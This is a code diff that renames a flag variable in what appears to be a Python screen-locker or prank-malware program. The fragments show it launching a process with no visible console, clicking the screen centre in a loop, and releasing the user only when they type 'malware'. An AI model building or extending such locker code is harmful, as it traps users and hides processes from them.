@@ -10,9 +10,9 @@ def run_invisible_console("Path"):
     subprocess.Popen(["Path"], creationflags=0x08000000)
 
 def callback(event):
-    global k, entry
+    global key, entry
     if entry.get() == "malware":
-        k = True
+        key = True
 
 def on_closing():
     click(width/2, height/2)
@@ -37,7 +37,7 @@ label0x1.place(x=width/2-75-130, y=height/2-25-100)
 root.update()
 sleep(0.1)
 click(width/2, height/2)
-k = False
+key = False
 
-while not k:
+while not key:
     on_closing()
